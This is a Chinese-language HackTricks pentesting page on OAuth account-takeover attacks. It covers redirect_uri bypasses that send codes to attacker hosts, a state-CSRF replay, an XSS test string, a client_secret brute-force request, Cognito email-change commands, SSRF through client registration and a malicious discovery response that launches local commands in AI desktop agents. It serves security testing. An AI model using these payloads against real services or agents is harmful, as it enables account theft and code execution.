# OAuth 到 账户接管

{{#include ../banners/hacktricks-training.md}}

## 基本信息 <a href="#d4a8" id="d4a8"></a>

OAuth 有多个版本，基础信息可见于 [OAuth 2.0 documentation](https://oauth.net/2/)。本讨论主要集中在广泛使用的 [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/)，该方案提供了一个**授权框架，使应用能够访问或代表用户对另一个应用（授权服务器）中的用户账户执行操作**。

考虑一个假想网站 _**https://example.com**_，用于**展示你所有的社交媒体帖子**（包括私密帖子）。为实现此目的，使用了 OAuth 2.0。_https://example.com_ 会请求你授权 **访问你的社交媒体帖子**。随后，_https://socialmedia.com_ 会显示一个同意屏幕，列出**所请求的权限以及发起请求的开发者**。在你授权后，_https://example.com_ 将能够**代表你访问你的帖子**。

在 OAuth 2.0 框架中，需要理解以下组件：

- **resource owner**: 你，作为**用户/实体**，授权访问你的资源，例如你的社交媒体账户的帖子。
- **resource server**: 在应用代表 resource owner 获取了 `access token` 之后，管理已认证请求的服务器，例如 **https://socialmedia.com**。
- **client application**: 向 resource owner 请求授权的应用，例如 **https://example.com**。
- **authorization server**: 在 resource owner 成功认证并获取授权后，向 client application 签发 `access tokens` 的服务器，例如 **https://socialmedia.com**。
- **client_id**: 应用的公开唯一标识符。
- **client_secret:** 仅为应用和 authorization server 所知的机密密钥，用于生成 `access_tokens`。
- **response_type**: 指定所请求令牌类型的值，例如 `code`。
- **scope**: client application 向 resource owner 请求的访问范围/级别。
- **redirect_uri**: 用户授权后重定向到的 URL，通常必须与预先注册的重定向 URL 相匹配。
- **state**: 在用户被重定向到授权服务器并返回时用于保持数据的参数。其唯一性对于作为 CSRF 保护机制非常重要。
- **grant_type**: 指示授权类型以及将返回的令牌类型的参数。
- **code**: 来自 authorization server 的授权码，客户端与 `client_id` 及 `client_secret` 一起使用该码以获取 `access_token`。
- **access_token**: 客户端代表 resource owner 发起 API 请求时使用的令牌。
- **refresh_token**: 允许应用在不再次提示用户的情况下获取新的 `access_token`。

### 流程

实际的 OAuth 流程如下：

1. 你访问 [https://example.com](https://example.com) 并点击 “Integrate with Social Media” 按钮。
2. 该站点向 [https://socialmedia.com](https://socialmedia.com) 发送请求，询问你是否授权 https://example.com 的应用访问你的帖子。该请求的结构如下：
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. 然后会显示一个同意页面。
4. 在你批准后，社交媒体向 `redirect_uri` 发送带有 `code` 和 `state` 参数的响应：
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com 利用这个 `code`，连同它的 `client_id` 和 `client_secret`，代表你发出服务器端请求以获取 `access_token`，从而可以访问你已同意的权限：
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. 最后，流程结束，因为 https://example.com 使用你的 `access_token` 发起 API 调用到社交媒体以访问

## 漏洞 <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), 授权服务器必须仅将浏览器重定向到 **pre-registered, exact redirect URIs**。此处的任何弱点都允许攻击者通过恶意授权 URL 将受害者引导过去，使得 IdP 将受害者的 `code`（和 `state`）直接发送到攻击者的端点，攻击者随后可以兑换它并窃取令牌。

典型攻击流程：

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` 并将其发送给受害者。
2. 受害者进行认证并批准 scopes。
3. IdP 重定向到 `attacker.tld/callback?code=<victim-code>&state=...`，攻击者在该处记录请求并立即兑换该 `code`。

常见的验证漏洞包括：

- **No validation** – 任何绝对 URL 都被接受，从而立即导致 code 被窃取。
- **Weak substring/regex checks on the host** – 可用类似域名绕过，例如 `evilmatch.com`、`match.com.evil.com`、`match.com.mx`、`matchAmatch.com`、`evil.com#match.com` 或 `match.com@evil.com`。
- **IDN homograph mismatches** – 验证在 punycode 形式（`xn--`）上进行，但浏览器会重定向到攻击者控制的 Unicode 域名。
- **Arbitrary paths on an allowed host** – 将 `redirect_uri` 指向 `/openredirect?next=https://attacker.tld` 或任何 XSS/用户内容端点，leaks 该 code（通过链式重定向、Referer 头或注入的 JavaScript）。
- **Directory constraints without normalization** – 像 `/oauth/*` 的模式可以被 `/oauth/../anything` 绕过。
- **Wildcard subdomains** – 接受 `*.example.com` 意味着任何接管（dangling DNS、S3 bucket 等）都会立即产生有效的回调。
- **Non-HTTPS callbacks** – 允许 `http://` URI 会让网络攻击者（Wi-Fi、公司代理）有机会在传输途中截获 code。

还要审查辅助的重定向类参数（`client_uri`、`policy_uri`、`tos_uri`、`initiate_login_uri` 等）以及 OpenID discovery 文档（`/.well-known/openid-configuration`），查找可能继承相同验证漏洞的额外端点。

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

正如该漏洞赏金报告中所述 [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html)，在用户认证后重定向的 **URL 被反射到服务器响应中**，可能导致 **易受 XSS 攻击**。可测试的 payload：
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - state 参数处理不当 <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: 客户端必须为每个浏览器实例生成一个 **加密随机值（cryptographically random value per browser instance）**，把它持久化到只有该浏览器能读取的位置（cookie、local storage 等），在授权请求中发送，并拒绝任何未返回相同值的响应。当该值是静态的、可预测的、可选的或未绑定到用户会话时，攻击者可以完成自己的 OAuth 流程，截获最终的 `?code=` 请求（不发送），并在之后诱导受害者浏览器重放该请求，从而使受害者账户被关联到攻击者的 identity provider 配置文件。

重放模式始终相同：

1. 攻击者使用他们的账户对 IdP 进行认证并拦截包含 `code`（以及任何 `state`）的最后一次重定向。
2. 他们丢弃该请求，保存 URL，随后利用任何 CSRF 原语（链接、iframe、自动提交表单）强制受害者浏览器加载该 URL。
3. 如果客户端不强制检查 `state`，应用会消费攻击者的授权结果并把攻击者登录到受害者的应用账户。

测试时 `state` 处理的实用检查清单：

- **Missing `state` entirely** – 如果该参数从未出现，整个登录流程就可被 CSRF 利用。
- **`state` not required** – 从初始请求中移除它；如果 IdP 仍然签发并且客户端接受 code，则防护是可选的（opt-in）。
- **Returned `state` not validated** – 篡改响应中的值（使用 Burp、MITM proxy）。接受不匹配的值意味着存储的令牌从未被比较。
- **Predictable or purely data-driven `state`** – 许多应用将重定向路径或 JSON blob 塞入 `state`，却未混入随机熵，允许攻击者猜测有效值并重放流程。始终在编码数据前后加入强随机熵。
- **`state` fixation** – 如果应用允许用户提供 `state` 值（例如通过构造的 authorization URLs）并在整个流程中重用它，攻击者可以锁定已知值并跨受害者重复使用。

PKCE 可以补充 `state`（尤其对 public clients），通过把 authorization code 绑定到一个 code verifier，但 web 客户端仍必须跟踪 `state` 以防止跨用户的 CSRF/账户关联漏洞。

### 账户接管前情形 <a href="#ebe4" id="ebe4"></a>

1. **在创建账户时不验证 Email**：攻击者可以使用受害者的邮箱预先创建账户。如果受害者随后使用第三方服务登录，应用可能会无意中将该第三方账户链接到攻击者预先创建的账户，导致未授权访问。
2. **利用宽松的 OAuth 邮箱验证**：攻击者可以利用不验证邮箱的 OAuth 服务，注册后再把账户邮箱改为受害者的邮箱。这种方法同样存在未授权访问的风险，与第一种场景类似但通过不同的攻击路径实现。

### 机密泄露 <a href="#e177" id="e177"></a>

`client_id` 是故意公开的，但 **`client_secret` 绝不能被终端用户恢复**。在 Authorization Code 部署中把 secret 嵌入到 **mobile APKs、desktop clients 或 single-page apps**，实际上是把该凭证交给了任何能下载该包的人。检查 public clients 时应：

- 解包 APK/IPA、desktop installer 或 Electron 应用，并 grep 查找 `client_secret`、可解码为 JSON 的 Base64 blob，或硬编码的 OAuth 端点。
- 审查捆绑的配置文件（plist、JSON、XML）或反编译后的字符串以查找客户端凭据。

一旦攻击者提取出 secret，就只需窃取任意受害者的授权 `code`（通过弱 `redirect_uri`、日志等）便可以独立请求 `/token` 并铸造 access/refresh tokens，而无需涉及合法应用。将 public/native 客户端视为 **无法保管 secrets**——它们应依赖 PKCE (RFC 7636) 来证明对每个实例 code verifier 的持有，而不是静态 secret。在测试期间，确认 PKCE 是否强制启用，以及后端是否确实拒绝既不包含 `client_secret` **也不包含** 有效 `code_verifier` 的 token 交换。

### Client Secret Bruteforce <a href="#..." id="..."></a>

You can try to **bruteforce the `client_secret`** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

一旦客户端获得了 **code 和 state**，如果它们出现在 **`location.href`** 或 **`document.referrer`** 中并被转发给第三方，就会导致 leaking。两个常见模式：

- **Classic Referer leak**: 在 OAuth 重定向之后，任何保持 `?code=&state=` 在 URL 中的导航都会将它们推入发送给 CDNs/analytics/ads 的 **Referer** header。
- **Telemetry/analytics confused deputy**: 一些 SDK（pixels/JS loggers）会对 `postMessage` 事件做出反应，然后**使用消息中提供的 token 将当前的 `location.href`/`referrer` 发送到后端 API**。如果你能在该流程中注入自己的 token（例如，通过攻击者控制的 postMessage 转发），你随后可以读取 SDK 的 API 请求历史/日志并从这些请求中恢复受害者嵌入的 OAuth artifacts。

### Access Token Stored in Browser History

Authorization Code grant 的核心保障是 **access tokens 不会到达 resource owner 的浏览器**。当实现把 tokens 泄露到客户端时，任何小漏洞（XSS、Referer leak、代理日志）都会立即导致账户被攻破。务必检查：

- **Tokens in URLs** – 如果 `access_token` 出现在 query/fragment 中，它会落入浏览器历史、服务器日志、analytics，以及发送给第三方的 Referer header。
- **Tokens transiting untrusted middleboxes** – 通过 HTTP 返回 tokens 或通过调试/公司代理转发，会使网络观察者直接捕获它们。
- **Tokens stored in JavaScript state** – React/Vue stores、全局变量或序列化的 JSON blob 会将 tokens 暴露给同源下的每个脚本（包括 XSS payload 或恶意扩展）。
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` 在共享设备上会在登出后长时间保留 tokens，并且可被脚本访问。

上述任一发现通常会把原本“低级别”的漏洞（如 CSP 绕过或 DOM XSS）升级为完整的 API 接管，因为攻击者可以简单地读取并重放泄露的 bearer token。

### Everlasting Authorization Code

Authorization codes 必须是 **短生命周期、一次性、并能检测重放**。在评估一个流程时，抓取一个 `code` 并：

- **Test the lifetime** – RFC 6749 建议以分钟为单位，而不是小时。尝试在 5–10 分钟后兑换该 code；如果仍然有效，那么该 code 的暴露窗口过长。
- **Test sequential reuse** – 发送相同的 `code` 两次。如果第二次请求仍返回另一个 token，攻击者就可以无限克隆会话。
- **Test concurrent redemption/race conditions** – 并行发起两个 token 请求（Burp intruder、turbo intruder）。弱安全的发行方有时会同时授予两个请求。
- **Observe replay handling** – 重用尝试不仅应该失败，而且还应撤销任何已由该 code 铸造的 tokens。否则，一次检测到的重放会使攻击者的第一个 token 保持有效。

将容易重放的 code 与任何 `redirect_uri` 或日志问题结合，允许在受害者完成合法登录后仍然保持持久的账户访问。

### Authorization/Refresh Token not bound to client

如果你能获得 **authorization code** 并**用不同的 client/app 兑换它**，你就可以接管其他账户。通过以下方法测试绑定弱点：

- 捕获针对 **app A** 的 `code` 并将其发送到 **app B 的 token endpoint**；如果仍然收到 token，说明 audience binding 已被破坏。
- 尝试那些应该仅限于自己 client IDs 的 first-party token minting endpoints；如果它们在只验证 code 的情况下接受任意 `state`/`app_id`，你实际上可以执行 **authorization-code swap** 来铸造权限更高的 first-party tokens。
- 检查 client binding 是否忽略 nonce/redirect URI 不匹配。如果错误页面仍会加载记录 `location.href` 的 SDK，将其与 Referer/telemetry leaks 结合即可窃取 codes 并在其他地方兑换。

任何将 `code` → token 交换的 endpoint **必须** 验证签发 client、redirect URI 和 nonce；否则，来自任意 app 的被窃取 code 都可以被升级为 first-party access token。

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

在这份 bug bounty 报告中： [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)，可以看到 AWS Cognito 返回给用户的 **token** 可能具有 **足够的权限覆盖用户数据**。因此，如果你可以**将某用户的 email 更改为另一个 email**，你可能能够接管其他人的账户。
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
欲了解有关如何滥用 AWS Cognito 的更详细信息，请参阅 [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)。

### 滥用其他应用的 tokens <a href="#bda5" id="bda5"></a>

正如 [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts) 所述，期望接收 **token**（而不是 code）的 OAuth 流，如果不检查该 token 是否属于该应用，就可能存在漏洞。

这是因为一个 **attacker** 可以在自己的应用中创建一个 **application supporting OAuth and login with Facebook**（例如）。然后，一旦受害者在 **attackers application** 中使用 Facebook 登录，attacker 就可能获取分配给其应用的该用户的 **OAuth token**，并使用该 token 在受害者的 OAuth 应用中以受害者的身份登录。

> [!CAUTION]
> 因此，如果 attacker 设法让用户访问他自己的 OAuth application，他将能够接管那些期望接收 token 且没有检查该 token 是否被授予其 app ID 的应用中的受害者账户。

### Two links & cookie <a href="#bda5" id="bda5"></a>

根据 [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，可以让受害者打开一个其 **returnUrl** 指向 attacker 主机的页面。该信息会被**存储在 cookie（RU）**中，并且在**后续步骤**中，**prompt** 会**询问**用户是否要授予该 attacker 主机访问权限。

为了绕过该 prompt，可以先打开一个标签页以初始化 **Oauth flow**，该流程会使用 **returnUrl** 设置该 RU cookie，在 prompt 显示之前关闭该标签页，然后打开一个不带该值的新标签页。这样，**prompt 不会提示 attacker 的主机信息**，但 cookie 已被设置为该主机，因此 token 会在重定向时被发送到 attacker 主机。

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

如 [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q) 中所述，一些 OAuth 实现允许将 GET 参数 **`prompt`** 指定为 None（**`&prompt=none`**），以在用户已在平台登录的情况下**防止在 web 上弹出提示要求确认**所请求的访问。

### response_mode

如 [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q)，可能可以指定参数 **`response_mode`** 来指明希望最终 URL 中以何种方式提供 code：

- `response_mode=query` -> code 会作为 GET 参数提供：`?code=2397rf3gu93f`
- `response_mode=fragment` -> code 会放在 URL 的 fragment 部分：`#code=2397rf3gu93f`
- `response_mode=form_post` -> code 会放在一个 POST 表单中，表单有个名为 `code` 的 input，其 value 为 code
- `response_mode=web_message` -> code 会通过 post message 发送：`window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login 对话框是理想的 clickjacking 目标：如果它们可以被嵌入框架，attacker 可以覆盖自定义图形、隐藏真实按钮，并欺骗用户批准危险的 scopes 或关联账户。构建 PoCs 时可以：

1. 在 `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` 中加载 IdP authorization URL。
2. 使用绝对定位/不透明度技巧将伪按钮与隐藏的 **Allow**/**Approve** 控件对齐。
3. 可选地预填参数（scopes、redirect URI），以便被盗的授权立即对 attacker 有利。

测试时确认 IdP 页面是否发出了 `X-Frame-Options: DENY/SAMEORIGIN` 或限制性的 `Content-Security-Policy: frame-ancestors 'none'`。如果两者都不存在，使用诸如 [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) 之类的工具演示风险，并记录受害者多么容易就授权了 attacker 的应用。有关更多 payload 想法，请参见 [Clickjacking](clickjacking.md)。

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

根据 [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96)，该 OAuth 流允许通过 **username** 和 **password** 在 OAuth 中登录。如果在这个简单流程中返回了具有用户可执行所有操作权限的 **token**，那么就有可能使用该 token 绕过 2FA。

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

这篇 [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) 说明了如何滥用 **open redirect** 来基于 **referrer** 的值滥用 OAuth 达到 ATO。攻击流程如下：

1. 受害者访问 attacker 的网页
2. 受害者打开恶意链接，opener 启动 Google OAuth 流，额外参数包含 `response_type=id_token,code&prompt=none`，并使用 **referrer 为 attacker 网站**。
3. 在 opener 中，提供者授权受害者后，会将他们重定向回 `redirect_uri` 参数的值（受害者网站），并返回 30X code，这仍然会保留 attacker 网站作为 referer。
4. 受害者的网站**根据 referrer 触发 open redirect**，将受害者重定向到 attacker 网站，由于 **`respose_type`** 为 **`id_token,code`**，code 会被发送回攻击者并出现在 URL 的 **fragment** 中，从而允许攻击者通过 Google 在受害者站点接管用户账户。

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **了解此技术的更多细节。**

Dynamic Client Registration 在 OAuth 中是一个不那么明显但关键的攻击向量，特别是用于 **Server-Side Request Forgery (SSRF)** 攻击。该端点允许 OAuth 服务接收关于客户端应用的详细信息，包括可能被利用的敏感 URL。

关键点：

- **Dynamic Client Registration** 通常映射到 `/register`，并接受如 `client_name`、`client_secret`、`redirect_uris` 以及通过 POST 提交的 logo 或 JSON Web Key Sets (JWKs) 的 URL。
- 此功能遵循 **RFC7591** 和 **OpenID Connect Registration 1.0** 中的规范，这些规范包含可能易受 SSRF 攻击的参数。
- 注册过程可能以多种方式无意中导致服务器暴露于 SSRF：
  - **`logo_uri`**：客户端应用的 logo URL，服务器可能会拉取该 URL，从而触发 SSRF 或在 URL 处理不当时导致 XSS。
  - **`jwks_uri`**：指向客户端 JWK 文档的 URL，如果被恶意构造，可能导致服务器向攻击者控制的服务器发起外部请求。
  - **`sector_identifier_uri`**：引用 `redirect_uris` 的 JSON 数组，服务器可能会拉取该 URI，从而产生 SSRF 机会。
  - **`request_uris`**：列出客户端允许的 request URIs，如果服务器在授权开始时拉取这些 URIs，可能被利用。

利用策略：

- 通过在 `logo_uri`、`jwks_uri` 或 `sector_identifier_uri` 等参数中注册包含恶意 URL 的新客户端，可以触发 SSRF。
- 虽然通过 `request_uris` 的直接利用可能会被白名单控制缓解，但提供一个预先注册且由 attacker 控制的 `request_uri`，可以在授权阶段促成 SSRF。

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

对 [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) 的研究（影响诸如 Claude Desktop、Cursor 或 Windsurf 等 `mcp-remote` 客户端）显示，当客户端将 IdP 元数据直接转发给操作系统时，动态 OAuth discovery 会成为一个 RCE 原语。远程 MCP 服务器在 discovery 交换（`/.well-known/openid-configuration` 或任何元数据 RPC）期间返回一个由 attacker 控制的 `authorization_endpoint`。`mcp-remote ≤0.1.15` 然后会用接收到的任意字符串调用系统 URL handler（`start`、`open`、`xdg-open` 等），因此操作系统支持的任何 scheme/path 都会在本地被执行。

攻击流程

1. 将桌面 agent 指向恶意的 MCP/OAuth 服务器（`npx mcp-remote https://evil`）。agent 会收到 401 以及元数据。
2. 服务器返回类似如下的 JSON：
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. 客户端为所提供的 URI 启动操作系统的 handler。Windows 接受类似 `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."` 的 payload；macOS/Linux 接受 `file:///Applications/Calculator.app/...`，甚至接受像 `cmd://bash -lc '<payload>'` 这样的自定义 scheme（如果已注册）。
4. 因为这在任何用户交互之前发生，**仅仅将客户端配置为与攻击者服务器通信就会导致 code execution**。

**如何测试**

- 针对任何支持 OAuth 的桌面/代理，这些客户端通过 HTTP(S) 执行 discovery 并在本地打开返回的 endpoints（例如 Electron apps、CLI helpers、thick clients）。
- 拦截或托管 discovery 响应，并将 `authorization_endpoint`、`device_authorization_endpoint` 或类似字段替换为 `file://`、`cmd://`、UNC 路径或其他危险 schemes。
- 观察客户端是否验证 scheme/host。若不验证，则会在用户上下文下立即执行并证明存在此问题。
- 使用不同的 schemes 重复测试以映射完整攻击面（例如 `ms-excel:`、`data:text/html,`、custom protocol handlers），并演示跨平台覆盖范围。

## OAuth providers Race Conditions

如果你测试的平台是 OAuth provider，请[**阅读此处以测试可能的 Race Conditions**](race-condition.md)。

## Mutable Claims Attack

在 OAuth 中，sub 字段用于唯一标识用户，但其格式因 Authorization Server 而异。为统一用户标识，一些客户端使用 email 或用户 handle。然而，这样做有风险，因为：

- 某些 Authorization Servers 并不确保这些属性（例如 email）保持不可变。
- 在某些实现中——例如 **"Login with Microsoft"** ——客户端依赖 email 字段，而该字段是 **由 Entra ID 中的用户控制且未经过验证的**。
- 攻击者可以通过创建他们自己的 Azure AD 组织（例如 doyensectestorg）并使用它进行 Microsoft 登录来利用此漏洞。
- 尽管 Object ID（存储在 sub 中）是不可变且安全的，但依赖可变的 email 字段仍可能导致 account takeover（例如劫持 victim@gmail.com 之类的账户）。

## Client Confusion Attack

在一次 **Client Confusion Attack** 中，使用 OAuth Implicit Flow 的应用未能验证最终的 access token 是否为专门为其自身的 Client ID 生成。攻击者搭建一个公用网站，使用 Google 的 OAuth Implicit Flow，诱骗数千用户登录，从而收集原本用于攻击者站点的 access tokens。如果这些用户在另一个不验证 token 的 Client ID 的易受攻击网站上也有账户，攻击者就可以重用收集到的 tokens 来冒充受害者并接管他们的账户。

## Scope Upgrade Attack

Authorization Code Grant 类型涉及用于传输用户数据的安全 server-to-server 通信。然而，如果 Authorization Server 在 Access Token Request 中（该参数未在 RFC 中定义）隐式信任 scope 参数，恶意应用可能通过请求更高的 scope 来升级 authorization code 的权限。生成 Access Token 后，Resource Server 必须对其进行验证：对于 JWT tokens，这包括检查 JWT 签名并提取诸如 client_id 和 scope 的数据；而对于随机字符串 tokens，服务器必须查询 Authorization Server 以检索该 token 的详细信息。

## Redirect Scheme Hijacking

在移动端 OAuth 实现中，应用使用 **custom URI schemes** 来接收带有 Authorization Codes 的重定向。然而，由于多款应用可以在同一设备上注册相同的 scheme，因此“只有合法客户端控制重定向 URI”的假设被打破。例如在 Android 上，一个像 `com.example.app://` 的 Intent URI 会根据 app 的 scheme 和 intent-filter 中定义的可选过滤条件来捕获。由于 Android 的 intent resolution 可能比较宽泛——尤其当仅指定 scheme 时——攻击者可以注册一个带有精心构造 intent filter 的恶意应用来劫持 authorization code。这可以通过用户交互（当多个应用有资格处理该 intent 时）或通过利用过于特定的过滤器的绕过技术来实现 **account takeover**，详见 Ostorlab 的评估流程图。

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
